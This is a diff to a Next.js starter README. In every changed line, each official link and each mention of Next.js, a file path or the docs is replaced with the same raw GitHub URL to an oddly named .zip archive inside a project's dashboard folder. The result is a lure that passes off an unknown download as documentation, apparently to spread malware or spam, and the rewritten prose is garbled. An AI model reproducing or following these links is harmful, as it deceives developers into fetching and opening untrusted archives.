@@ -1,4 +1,4 @@
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+This is a [https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip).
 
 ## Getting Started
 
@@ -14,21 +14,21 @@ pnpm dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `app/page.js`. The page auto-updates as you edit the file.
+You can start editing the page by modifying `https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+This project uses [`next/font`](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) to automatically optimize and load Inter, a custom Google Font.
 
 ## Learn More
 
-To learn more about Next.js, take a look at the following resources:
+To learn more about https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip, take a look at the following resources:
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+- [https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip Documentation](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) - learn about https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip features and API.
+- [Learn https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) - an interactive https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip tutorial.
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
+You can check out [the https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip GitHub repository](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) - your feedback and contributions are welcome!
 
 ## Deploy on Vercel
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+The easiest way to deploy your https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip app is to use the [Vercel Platform](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) from the creators of https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
+Check out our [https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip deployment documentation](https://raw.githubusercontent.com/murad63/Ostad_Assignment_M14/main/src/app/dashboard/Ostad_Assignment_M14_vesiculate.zip) for more details.
